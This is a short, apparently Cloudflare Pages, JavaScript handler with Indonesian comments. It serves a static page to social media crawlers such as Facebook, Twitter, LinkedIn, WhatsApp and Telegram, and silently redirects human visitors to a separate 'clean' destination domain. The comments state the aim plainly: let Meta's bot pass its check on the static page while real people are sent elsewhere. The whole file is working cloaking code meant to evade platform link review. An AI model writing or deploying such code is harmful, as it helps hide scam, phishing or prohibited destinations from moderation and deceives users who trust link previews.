export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get("user-agent") || "";
  
  // Daftar signature bot sosmed yang ingin disaring
  const botPatterns = /facebookexternalhit|Facebot|Twitterbot|LinkedInBot|WhatsApp|TelegramBot/i;

  // Ganti dengan domain tujuan akhir yang baru dan bersih milikmu
  const targetDestination = "https://domain-tujuan-baru-kamu.com";

  if (botPatterns.test(userAgent)) {
    // Jika dibaca oleh bot Meta, biarkan mereka melihat halaman statis (lolos uji 200 OK)
    return context.env.ASSETS.fetch(request);
  } else {
    // Jika manusia asli, alihkan secara mulus ke tujuan akhir
    return Response.redirect(targetDestination, 302);
  }
}
